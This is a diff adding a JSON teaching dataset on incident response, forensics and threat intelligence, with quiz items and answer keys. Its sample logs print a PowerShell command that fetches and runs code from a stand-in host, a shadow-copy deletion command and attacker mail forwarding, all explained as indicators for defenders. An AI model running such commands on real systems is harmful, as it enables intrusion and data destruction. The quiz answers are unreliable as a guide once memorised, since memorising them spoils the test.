@@ -1,0 +1,2839 @@
+{
+  "schema_version": 1,
+  "domain": "incident-response-forensics-threat-intel",
+  "display_name": "Incident response, digital forensics and threat intelligence",
+  "author": "worker:C7",
+  "facts": [
+    {
+      "id": "ir-lifecycle-001",
+      "subtopic": "ir-lifecycle",
+      "difficulty": "foundational",
+      "title": "SP 800-61r3 reorganises incident response around CSF 2.0 functions",
+      "fact": "NIST SP 800-61 Revision 3 (April 2025) replaces the four sequential phases used in Revision 2 (2012) - Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity - with guidance organised around the six CSF 2.0 functions: Govern, Identify, Protect, Detect, Respond and Recover. Revision 3 treats incident response as a continuous capability managed across the whole risk-management lifecycle, so containment, communication and lessons learned can overlap instead of waiting for a phase gate. Organisations still using the 2012 model can map each phase to the newer functions, but plans and programme reporting should state which model and revision they follow.",
+      "details": [
+        "Revision 2 remains widely taught and is a useful mental model even though Revision 3 supersedes it.",
+        "The Respond function covers incident management, analysis, mitigation, reporting and communication.",
+        "Revision 3 is published as a CSF 2.0 Community Profile and references the CSF 2.0 implementation examples."
+      ],
+      "pitfalls": [
+        "Treating the r3 functions as a strict sequence, which reintroduces the phase-gate delay the revision was meant to remove.",
+        "Citing 'NIST 800-61' without a revision, leaving readers unsure whether the four-phase or CSF-aligned model is meant."
+      ],
+      "mcqs": [
+        {
+          "question": "Which statement best describes how SP 800-61r3 relates to the earlier four-phase incident response lifecycle?",
+          "options": [
+            "It keeps the four phases and adds a fifth governance phase.",
+            "It reorganises guidance around the six CSF 2.0 functions and treats incident response as continuous.",
+            "It removes the need for preparation because detection tooling now covers it.",
+            "It applies only to federal agencies in the United States."
+          ],
+          "answer": [1],
+          "rationale": "Revision 3 aligns incident response with CSF 2.0 (Govern, Identify, Protect, Detect, Respond, Recover) and frames it as an ongoing capability rather than a strict sequence, while the four-phase model from Revision 2 remains a usable mapping."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "NIST SP 800-61r2: Computer Security Incident Handling Guide",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r2/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "NIST Cybersecurity Framework 2.0",
+          "publisher": "NIST",
+          "url": "https://www.nist.gov/cyberframework",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["nist", "lifecycle", "programme", "csf"]
+    },
+    {
+      "id": "ir-prep-002",
+      "subtopic": "ir-preparation",
+      "difficulty": "foundational",
+      "title": "What preparation must exist before an incident starts",
+      "fact": "Preparation is the phase where constraints are still negotiable: a named incident commander with deputies, an approved plan with scenario playbooks, offline copies of contact and escalation data, out-of-band communication that does not depend on possibly compromised mail or chat, an asset and identity inventory, known-good logging baselines, pre-staged forensic tooling, and pre-agreed legal, privacy, insurer and external-IR relationships. It also covers tested backups and documented decision rights, because during an incident nobody has time to negotiate who may isolate a production cluster. Preparation is never finished: it is re-validated after every exercise and every real incident.",
+      "details": [
+        "Playbooks should exist per scenario type (ransomware, business email compromise, credential theft, insider, web compromise, cloud) rather than as one generic document.",
+        "Out-of-band contact data must remain usable when email, single sign-on and the VPN are all suspect.",
+        "Contact and escalation lists should be printable and stored offline, not only in the wiki."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "for f in ir-plan.md contacts.txt playbooks/*.md; do test -s \"$f\" || echo \"MISSING $f\"; done",
+          "purpose": "Check that key incident response documents exist and are non-empty in an offline kit directory."
+        }
+      ],
+      "configs": [
+        {
+          "language": "yaml",
+          "snippet": "playbook_id: ransomware-v3\nowner: ir-lead\nseverity_floor: P2\nlast_tested: 2026-02-11\napprovals:\n  isolate_production: incident-commander\n  public_statement: communications-lead\n  legal_hold: counsel",
+          "purpose": "Illustrative playbook metadata that records ownership, severity floor, test date and decision rights."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which item is most valuable specifically because it does not depend on infrastructure that may already be compromised?",
+          "options": [
+            "A SIEM dashboard with live alerting",
+            "An offline copy of contacts, procedures and out-of-band communication details",
+            "A vulnerability scanner with current signatures",
+            "A cloud-hosted incident ticketing system"
+          ],
+          "answer": [1],
+          "rationale": "During identity or mail compromise the normal collaboration stack may be untrustworthy or unavailable, so offline contact data, procedures and an out-of-band channel keep the response running."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Adopting a commercial incident response vendor's PDF playbook completes preparation.",
+          "correction": "A playbook is only a draft until roles, decision rights, contact data, tooling access and backups have been tested against your own estate; untested documents routinely fail at the first inject, for example when nobody can reach the person authorised to isolate a system."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Federal Government Cybersecurity Incident and Vulnerability Response Playbooks",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/resources-tools/resources/federal-government-cybersecurity-incident-and-vulnerability-response-playbooks",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["preparation", "playbooks", "roles", "communications"]
+    },
+    {
+      "id": "ir-severity-003",
+      "subtopic": "ir-severity",
+      "difficulty": "foundational",
+      "title": "Severity should follow business impact, not technical novelty",
+      "fact": "Severity classification determines who is woken, what money is spent and which regulators are told, so it must be anchored in business impact: sensitivity and volume of data, number of identities and hosts, involvement of privileged or service accounts, safety and availability effects, contractual and regulatory exposure, and whether the actor is still active. Technical signals such as a critical CVE or a high-signature antivirus alert are inputs, not the classification. Declaration criteria should be written with concrete examples, a named declaring authority and a deputy, and a documented path to upgrade or downgrade. Ambiguity produces over-declaration and, far more often, costly under-declaration while analysts wait for certainty.",
+      "details": [
+        "A usable four-tier example: P1 confirmed active compromise of crown-jewel data or safety-relevant systems; P2 confirmed compromise with limited scope; P3 credible suspicion not yet confirmed; P4 policy violation or no impact after triage.",
+        "The declaring authority must be reachable out of band and able to act without convening a committee.",
+        "Record the rationale for the assigned severity, because it is reviewed after the incident."
+      ],
+      "configs": [
+        {
+          "language": "yaml",
+          "snippet": "severity_matrix:\n  P1:\n    criteria: [active_crown_jewel_compromise, safety_impact]\n    notify: [ciso, ceo, counsel, privacy_office, insurer]\n    cadence: 30m\n  P2:\n    criteria: [confirmed_compromise_limited_scope]\n    notify: [ciso, ir_lead, counsel]\n    cadence: 2h\n  P3:\n    criteria: [credible_suspicion_unconfirmed]\n    notify: [ir_lead]\n  P4:\n    criteria: [policy_violation_no_impact]",
+          "purpose": "Illustrative severity matrix that ties tiers to criteria, notification lists and update cadence."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "An analyst finds a critical-rated vulnerability on an internet-facing appliance but no evidence of exploitation. What is the most defensible severity driver?",
+          "options": [
+            "The CVSS score alone, because it is the industry standard",
+            "The business impact if exploited, combined with current evidence of exploitation and exposure",
+            "The vendor's marketing severity label",
+            "Whether the appliance is mentioned in a news article"
+          ],
+          "answer": [1],
+          "rationale": "CVSS describes technical severity in the abstract; incident severity depends on impact to this organisation plus evidence and exposure. A critical CVE on an unexposed, patched-in-days system is not the same incident as confirmed exploitation of a crown-jewel service."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Declaring an incident too early damages credibility, so teams should wait until compromise is proven.",
+          "correction": "Waiting for proof is the more common and more expensive error: containment, evidence preservation and notification clocks all start late. A documented suspicion-level tier lets the organisation respond proportionately and downgrade if triage clears it."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Federal Government Cybersecurity Incident and Vulnerability Response Playbooks",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/resources-tools/resources/federal-government-cybersecurity-incident-and-vulnerability-response-playbooks",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["severity", "declaration", "governance"]
+    },
+    {
+      "id": "ir-triage-004",
+      "subtopic": "ir-detection-analysis",
+      "difficulty": "intermediate",
+      "title": "Detection and analysis: validate, scope, then decide",
+      "fact": "Triage is a loop rather than a checklist: confirm the alert is real by checking rule logic and known-good activity, establish scope (which identities, hosts, accounts and time window), decide whether containment can wait while evidence is collected, and record the reasoning. The most expensive mistake is remediating the first visible host before answering how many others exist. Pivot on identity and logon activity, process lineage including parent and grandparent, file hashes, scheduled tasks and services, and network destinations. Scope drives severity, and severity drives who is told and how fast.",
+      "details": [
+        "Write the working hypothesis down and then look for evidence that falsifies it; untested hypotheses become blind spots.",
+        "Check whether the same tooling or account appears in other telemetry sources before concluding the case is a single host.",
+        "Time-box triage and escalate on scope rather than on certainty."
+      ],
+      "logs": [
+        {
+          "context": "EDR process tree alert on host-01",
+          "text": "2026-03-04T09:12:44Z host-01 WINWORD.EXE (pid 5120) -> powershell.exe (pid 6188)\n  cmdline: powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('hxxp://cdn-update.example.test/a')\"\n  user: EXAMPLE\\a.nguyen\n  parent: explorer.exe (pid 3020)",
+          "reading": "Office spawning a hidden PowerShell that downloads and executes remote content is a high-fidelity execution chain (T1059.001 plus T1204.002). The next pivots are the child processes of pid 6188, any outbound connections to that host, other hosts where WINWORD.EXE has the same parent-child pattern, and whether the account shows new logons elsewhere."
+        }
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1; StartTime=(Get-Date).AddHours(-24)} | Where-Object {$_.Message -match 'powershell'} | Select-Object -First 20",
+          "purpose": "Pull recent Sysmon process-creation events mentioning PowerShell so parent processes and command lines can be compared."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "During triage of a suspected endpoint compromise, which action should come before remediating the first affected host?",
+          "options": [
+            "Reimaging the host to remove the malware",
+            "Establishing scope across identities, hosts and the time window",
+            "Sending a company-wide notification",
+            "Closing the alert as a false positive"
+          ],
+          "answer": [1],
+          "rationale": "Scope determines whether this is a single-host event or a campaign, and it drives severity, containment choice and notification. Reimaging first destroys evidence and frequently leaves other compromised hosts untouched."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Sysmon",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["triage", "scoping", "edr", "process-lineage"]
+    },
+    {
+      "id": "ir-evidence-005",
+      "subtopic": "ir-evidence",
+      "difficulty": "foundational",
+      "title": "Evidence preservation and chain of custody",
+      "fact": "Evidence handling has to survive scrutiny months later, so the basics are non-negotiable: collect the most volatile data first, use a hardware or software write blocker before touching a disk, hash at acquisition and re-hash before analysis, keep the original sealed and work from verified copies, and record for every item who collected it, when in UTC, where, why, with what tool and version, and the resulting hash. Chain-of-custody records must show every transfer of physical or logical custody, including internal handoffs between analysts. Preservation decisions made in the first hour are the ones challenged in reviews, tribunals and courts.",
+      "details": [
+        "A SHA-256 recorded at acquisition and re-verified later detects accidental alteration; it does not prove the evidence was untouched before acquisition.",
+        "Store images on media with integrity checking, and document storage location and who has access.",
+        "Do not boot a suspect disk, run antivirus over it, or open files directly from it on an analysis workstation."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "sha256sum /evidence/host-01.dd | tee /evidence/host-01.dd.sha256",
+          "purpose": "Compute and store the acquisition hash of an evidence image."
+        },
+        {
+          "language": "bash",
+          "code": "sha256sum -c /evidence/host-01.dd.sha256",
+          "purpose": "Re-verify image integrity before and after analysis."
+        }
+      ],
+      "configs": [
+        {
+          "language": "yaml",
+          "snippet": "evidence_id: EV-2026-014-003\nitem: disk image host-01\ncollected_by: j.okoro\ncollected_at: 2026-03-04T11:20:00Z\nlocation: /evidence/host-01.dd\ntool: dc3dd 7.2.646\nhash_sha256: <64 hex characters>\ncustody:\n  - {from: j.okoro, to: evidence-locker, at: 2026-03-04T12:05:00Z}\n  - {from: evidence-locker, to: m.silva, at: 2026-03-05T08:30:00Z}",
+          "purpose": "Illustrative custody record showing required fields for each evidence item and transfer."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "What does a matching SHA-256 taken at acquisition and re-checked before analysis actually demonstrate?",
+          "options": [
+            "That the suspect never committed the act under investigation",
+            "That the image has not changed since the hash was recorded",
+            "That the acquisition tool is court-approved",
+            "That the original disk was never written to before acquisition"
+          ],
+          "answer": [1],
+          "rationale": "A hash comparison proves integrity from the moment of hashing onward. It says nothing about events before acquisition, tool approval, or guilt, which is why write blocking and contemporaneous records matter separately."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Once the image hash matches, the evidence is automatically admissible.",
+          "correction": "Admissibility is a legal determination that also depends on lawful collection, documented custody, tool reliability and relevance. A matching hash supports integrity but cannot cure an undocumented break in custody or an unlawful search."
+        }
+      ],
+      "references": [
+        {
+          "title": "RFC 3227: Guidelines for Evidence Collection and Archiving",
+          "publisher": "IETF",
+          "url": "https://www.rfc-editor.org/rfc/rfc3227.html",
+          "license": "IETF Trust Legal Provisions"
+        },
+        {
+          "title": "ISO/IEC 27037:2012 Guidelines for identification, collection, acquisition and preservation of digital evidence",
+          "publisher": "ISO/IEC",
+          "url": "https://www.iso.org/standard/44381.html",
+          "license": "ISO copyright (paid standard)"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["evidence", "chain-of-custody", "hashing", "preservation"]
+    },
+    {
+      "id": "ir-comms-006",
+      "subtopic": "ir-communications",
+      "difficulty": "intermediate",
+      "title": "Communications, legal and privacy escalation during an incident",
+      "fact": "Communications fail in predictable ways: too many voices, technical detail leaking to customers, and legal or privacy teams learning about a personal-data incident from the press. Appoint one external spokesperson and one internal coordinator, agree a cadence for holding statements, and route anything touching personal data, regulated data, contracts or criminal conduct through counsel and the privacy office immediately. In many jurisdictions counsel should direct the investigation so that work product can be argued as privileged, and privilege markings must be applied deliberately rather than pasted onto every document. Never speculate publicly about cause, actor or scope while the facts are still moving.",
+      "details": [
+        "GDPR Article 33 requires notifying the supervisory authority within 72 hours of becoming aware of a personal-data breach unless it is unlikely to result in a risk to rights and freedoms.",
+        "Notification duties vary by sector and country; the privacy office decides, not the incident commander.",
+        "Prepare internal, customer, regulator and media templates before an incident so the first statement is not drafted under pressure."
+      ],
+      "mcqs": [
+        {
+          "question": "Why is a single external spokesperson combined with a single internal coordinator preferable to letting technical leads brief customers directly?",
+          "options": [
+            "It reduces the chance of inconsistent, speculative or legally risky statements while keeping internal decisions coordinated",
+            "It is required by ISO 27001 certification",
+            "It guarantees the organisation will avoid regulatory notification",
+            "It prevents the attacker from learning about the response"
+          ],
+          "answer": [0],
+          "rationale": "Technical leads often disclose unverified detail that becomes a public commitment or a legal problem. A single voice with an agreed cadence keeps statements consistent and reviewed, while an internal coordinator ensures decisions and facts flow to the right teams."
+        }
+      ],
+      "pitfalls": [
+        "Sending the first external statement before counsel and privacy have reviewed the facts that are being asserted.",
+        "Allowing the incident bridge to be the only record, so nothing is attributable or reproducible later."
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Regulation (EU) 2016/679 (General Data Protection Regulation), Article 33",
+          "publisher": "EUR-Lex",
+          "url": "https://eur-lex.europa.eu/eli/reg/2016/679/oj",
+          "license": "EUR-Lex reuse decision 2011/833/EU"
+        }
+      ],
+      "tags": ["communications", "privacy", "legal", "gdpr"]
+    },
+    {
+      "id": "ir-legal-007",
+      "subtopic": "ir-legal",
+      "difficulty": "advanced",
+      "title": "Legal hold, spoliation risk and notification duties",
+      "fact": "Once litigation, a regulator inquiry or a criminal referral is reasonably anticipated, a legal hold must suspend routine deletion: mailbox retention policies, log rotation, backup expiry, ticketing cleanup and laptop wipes. Destroying evidence after a hold is issued risks spoliation sanctions and adverse inference, and in some jurisdictions criminal liability. Notification clocks differ sharply: GDPR's 72-hour supervisory-authority deadline, US state breach laws with varying definitions of personal information, and the US SEC rule requiring public companies to file an Item 1.05 Form 8-K within four business days of determining that an incident is material. The incident commander should know which clocks are running, who owns each one, and what evidence each obligation requires.",
+      "details": [
+        "A hold notice should identify custodians, data sources, date ranges and the person responsible for enforcement.",
+        "Preserve in place where possible, but verify that retention tooling and automatic deletion will not expire items during the hold.",
+        "Engagement with law enforcement is a strategy decision: it can preserve evidence and enable disruption, but it may complicate disclosure timelines and control of the investigation."
+      ],
+      "mcqs": [
+        {
+          "question": "An organisation reasonably anticipates litigation and issues a legal hold. Which action is most likely to create spoliation risk?",
+          "options": [
+            "Hashing and imaging the affected laptops before returning them to users",
+            "Allowing a 30-day mailbox retention policy to delete the custodian's messages during the hold",
+            "Exporting audit logs to a separate evidence store",
+            "Documenting which analysts accessed the evidence"
+          ],
+          "answer": [1],
+          "rationale": "A legal hold suspends routine destruction. Letting an automated retention policy delete relevant messages during the hold destroys evidence the organisation is obliged to preserve, which is the essence of spoliation."
+        }
+      ],
+      "pitfalls": [
+        "Assuming a cloud provider's default retention is sufficient; many SaaS audit logs expire in 30 to 180 days unless exported.",
+        "Letting the incident response vendor delete its working copies at case closure before legal confirms no hold applies."
+      ],
+      "references": [
+        {
+          "title": "SEC Adopts Rules on Cybersecurity Risk Management, Strategy, Governance, and Incident Disclosure (Press Release 2023-139)",
+          "publisher": "US Securities and Exchange Commission",
+          "url": "https://www.sec.gov/news/press-release/2023-139",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Regulation (EU) 2016/679 (General Data Protection Regulation), Article 33",
+          "publisher": "EUR-Lex",
+          "url": "https://eur-lex.europa.eu/eli/reg/2016/679/oj",
+          "license": "EUR-Lex reuse decision 2011/833/EU"
+        },
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["legal-hold", "spoliation", "notification", "sec", "gdpr"]
+    },
+    {
+      "id": "ir-ransom-008",
+      "subtopic": "ir-playbook-ransomware",
+      "difficulty": "intermediate",
+      "title": "Ransomware playbook: scope, isolate, assume theft",
+      "fact": "The first moves in a ransomware incident are to confirm scope, isolate affected systems at the network layer without powering them off so memory and encryption artifacts survive, preserve at least one encrypted host with its ransom note untouched, and verify whether backups are intact and immutable before promising restoration. Modern extortion is usually double: data is stolen before encryption, so hunting for exfiltration through proxy, DNS and cloud logs is part of containment, not an afterthought. Payment decisions belong to executives with legal and sanctions advice, because paying does not guarantee decryption and may raise sanctions exposure. Recovery should start from a rebuilt, patched estate rather than restoring over a compromised identity plane.",
+      "details": [
+        "If Active Directory compromise is suspected, reset the krbtgt account twice, separated by more than the domain's maximum ticket lifetime (10 hours by default), so existing tickets expire.",
+        "Immutable or offline backups are the control that changes the outcome; verify restore, not just backup success.",
+        "Expect accounts, scheduled tasks and remote-access paths created by the actor to survive reimaging of endpoints."
+      ],
+      "logs": [
+        {
+          "context": "EDR detection on a file server before encryption",
+          "text": "2026-03-04T02:41:09Z host-fs02 4688 process: vssadmin.exe\n  cmdline: vssadmin delete shadows /all /quiet\n  user: EXAMPLE\\svc-backup\n2026-03-04T02:43:55Z host-fs02 EDR: mass file rename detected (2143 files in 60s) by process encryptor.tmp.exe",
+          "reading": "Shadow-copy deletion followed within minutes by mass renames is the classic pre-encryption sequence (T1490 then T1486). The service account running vssadmin is itself a finding: either it is compromised or the binary is being run under stolen credentials. Isolate the file server's network path immediately and capture memory before any reboot."
+        }
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "vssadmin list shadows",
+          "purpose": "Read-only inventory of existing volume shadow copies to establish whether recovery points remain."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why is powering off a ransomware-affected server usually worse than network isolation?",
+          "options": [
+            "Powering off voids the vendor warranty",
+            "It destroys volatile memory evidence and may trigger additional damage on reboot, while isolation stops spread but preserves state",
+            "Ransomware only encrypts while the machine is running",
+            "Powering off prevents backups from completing"
+          ],
+          "answer": [1],
+          "rationale": "Shutdown discards memory-resident evidence such as keys and injected code, and some ransomware or its persistence can cause further damage at next boot. Network isolation limits spread while keeping the host available for memory capture and forensic imaging."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "If backups restore successfully, there is no need to investigate exfiltration.",
+          "correction": "Double-extortion actors steal data before encrypting. Restoring service without scoping theft leaves the organisation exposed to a second extortion demand, regulatory notification obligations and reputational harm, all of which require evidence from proxy, DNS, SaaS and endpoint logs."
+        }
+      ],
+      "references": [
+        {
+          "title": "StopRansomware resource hub",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/stopransomware",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["ransomware", "containment", "backups", "extortion"]
+    },
+    {
+      "id": "ir-bec-009",
+      "subtopic": "ir-playbook-bec",
+      "difficulty": "intermediate",
+      "title": "Business email compromise leaves identity and mail-flow artifacts",
+      "fact": "Business email compromise often involves no malware at all: an attacker with valid credentials or a stolen session token reads mail, creates hidden inbox rules, adds forwarding, registers an extra MFA method and sometimes grants OAuth consent to a malicious application. Investigation therefore focuses on identity and mail-flow telemetry: sign-in logs with unfamiliar locations, devices or user agents, mailbox audit events for rule creation and delegation, new application consents, and sent items containing changed bank details. Containment means revoking sessions and refresh tokens, removing rules and forwarding, resetting credentials, reviewing MFA registration, and warning finance and the counterparty bank before the next payment run.",
+      "details": [
+        "A hidden rule that moves messages to an obscure folder both hides replies and preserves the attacker's access to thread history.",
+        "Check for SendAs and FullAccess delegation grants, not only inbox rules.",
+        "Payment-fraud recovery depends on speed: banks may be able to recall funds only within a short window after transfer."
+      ],
+      "logs": [
+        {
+          "context": "Microsoft 365 unified audit log, mailbox rule creation",
+          "text": "2026-03-02T18:07:21Z New-InboxRule\n  User: victim@example.internal\n  ClientIP: 198.51.100.77\n  Parameters: Name=., SubjectContainsWords=invoice, MoveToFolder=RSS Subscriptions, MarkAsRead=$true\n2026-03-02T18:09:02Z Set-Mailbox\n  Parameters: ForwardingSmtpAddress=archive@example-relay.test, DeliverToMailboxAndForward=$true",
+          "reading": "A rule that hides invoice traffic and marks it read, followed by external forwarding from a single unfamiliar IP, is a high-confidence BEC pattern. The account is being used to intercept payment discussions. Revoke sessions, remove the rule and forwarding, then review sent items and any authentication changes."
+        }
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-InboxRule -Mailbox victim@example.internal | Select-Object Name,Enabled,ForwardTo,RedirectTo,MoveToFolder",
+          "purpose": "Enumerate inbox rules for a suspected compromised mailbox to find hidden forwarding or move rules."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which artifact most directly indicates that a mailbox is being used to intercept invoice conversations?",
+          "options": [
+            "A new inbox rule that moves messages containing 'invoice' to an unused folder and marks them read",
+            "An increase in mailbox storage consumption",
+            "A user changing their display name",
+            "A mobile device enrolling in MDM"
+          ],
+          "answer": [0],
+          "rationale": "Rules that conceal specific business conversations while marking them read are a hallmark of BEC, because they hide both the attacker's activity and the replies from the real recipient. Storage growth and display-name changes are weak, ambiguous signals."
+        }
+      ],
+      "references": [
+        {
+          "title": "Anti-phishing protection in Microsoft 365",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/defender-office-365/anti-phishing-protection-about",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Internet Crime Complaint Center (IC3) Annual Reports",
+          "publisher": "FBI IC3",
+          "url": "https://www.ic3.gov/",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["bec", "email", "identity", "fraud"]
+    },
+    {
+      "id": "ir-credtheft-010",
+      "subtopic": "ir-credential-theft",
+      "difficulty": "intermediate",
+      "title": "Credential theft response must evict sessions, not just reset passwords",
+      "fact": "Stolen credentials come in several forms - plaintext or cached passwords, Kerberos tickets, browser-stored secrets, LSASS memory dumps, and session cookies or OAuth refresh tokens - and each needs a different eviction step. A password reset does not invalidate a stolen refresh token or an existing Kerberos ticket, which is why incidents recur days after an apparently clean reset. Response should revoke sessions and tokens, remove attacker-registered MFA methods, rotate secrets and service-account credentials, and then hunt for the persistence the actor created while holding the account. For privileged identities, perform the reset from a clean, dedicated management workstation.",
+      "details": [
+        "Service accounts and application secrets such as API keys and app registration credentials are frequently forgotten and are high value.",
+        "Check for newly created accounts, mailbox delegations and application consents after eviction.",
+        "Token theft through adversary-in-the-middle phishing survives both password and MFA changes until sessions are revoked."
+      ],
+      "logs": [
+        {
+          "context": "Entra ID sign-in log after a password reset",
+          "text": "2026-03-06T04:12:55Z Sign-in\n  User: victim@example.internal\n  App: Office 365 Exchange Online\n  IP: 203.0.113.44\n  Auth: refresh token\n  Result: success\n2026-03-06T03:58:10Z User signed in from 198.51.100.77 (unfamiliar)\n2026-03-06T04:00:02Z Password changed by admin (ticket INC-4412)",
+          "reading": "A successful refresh-token sign-in from a new address minutes after an administrative password reset shows the token was never revoked. The reset did not evict the session. Revoke sessions and refresh tokens, then check what the token was used to access."
+        }
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Revoke-MgUserSignInSession -UserId victim@example.internal",
+          "purpose": "Revoke refresh tokens and existing sign-in sessions for a compromised Entra ID user."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "A user's password was stolen through an adversary-in-the-middle phishing page that also captured the session cookie. What else is required beyond a password reset?",
+          "options": [
+            "Nothing, a password reset ends the attacker's access",
+            "Revoke sessions and refresh tokens and review or reset registered MFA methods",
+            "Only enable sign-in risk alerts",
+            "Reimage the user's phone"
+          ],
+          "answer": [1],
+          "rationale": "Cookie and token theft lets the attacker continue using an authenticated session after the password changes. Revoking sessions and tokens plus reviewing MFA registration removes the attacker's persistence; a password reset alone leaves it in place."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "A password reset closes a credential-theft incident.",
+          "correction": "Refresh tokens, session cookies and Kerberos tickets can outlive a password change, and attacker-registered MFA methods can restore access. Eviction requires revoking sessions and tokens, reviewing authentication methods, rotating secrets and hunting for persistence."
+        }
+      ],
+      "references": [
+        {
+          "title": "Microsoft Entra ID sign-in logs",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "NIST SP 800-61r3: Incident Response Recommendations and Considerations for Cybersecurity Risk Management",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["credentials", "token-theft", "identity", "mfa"]
+    },
+    {
+      "id": "ir-insider-011",
+      "subtopic": "ir-playbook-insider",
+      "difficulty": "advanced",
+      "title": "Insider threat: legal lead, security support, no tipping off",
+      "fact": "Insider cases split into negligent, compromised and malicious, and the response differs: a compromised employee is a victim who needs credential eviction, while a malicious insider is an HR and legal matter in which security provides evidence. HR and counsel normally lead, because employment law, works councils and privacy regulation constrain monitoring, searches and interviews, and because premature confrontation destroys evidence and can expose the organisation to claims. Security's job is to preserve lawfully collected evidence on company systems under existing policy, establish data movement through staging, removable media, printing and cloud sync, and keep the circle of knowledge small. Documentation must be strong enough for an employment tribunal, not only for a SOC ticket.",
+      "details": [
+        "Behavioural precursors that are lawful to monitor include access outside role or hours, bulk downloads and resignation or disciplinary context.",
+        "Insider data often leaves through sanctioned channels such as personal cloud storage, email to self or printing rather than malware.",
+        "Chain of custody and reproducibility matter because the outcome may be reviewed by a tribunal rather than a security team."
+      ],
+      "mcqs": [
+        {
+          "question": "Security discovers an employee is staging large numbers of customer records in a personal cloud folder. Who should normally lead the response?",
+          "options": [
+            "The SOC, because it detected the behaviour",
+            "HR and legal counsel, with security providing preserved evidence and technical context",
+            "The employee's line manager, who should confront them immediately",
+            "The communications team"
+          ],
+          "answer": [1],
+          "rationale": "Insider cases are employment and legal matters constrained by privacy and labour law. HR and counsel direct the process and decide on interviews or disciplinary steps, while security preserves evidence and explains the technical findings. Immediate confrontation risks destroying evidence and creating legal exposure."
+        }
+      ],
+      "pitfalls": [
+        "Confronting the employee before evidence is preserved and the legal strategy is agreed.",
+        "Using monitoring data collected outside the policy or without required consultation, which can make it unusable."
+      ],
+      "references": [
+        {
+          "title": "Insider Threat Mitigation Guide",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/resources-tools/resources/insider-threat-mitigation-guide",
+          "license": "Public domain (US Government work)"
+        },
+        {
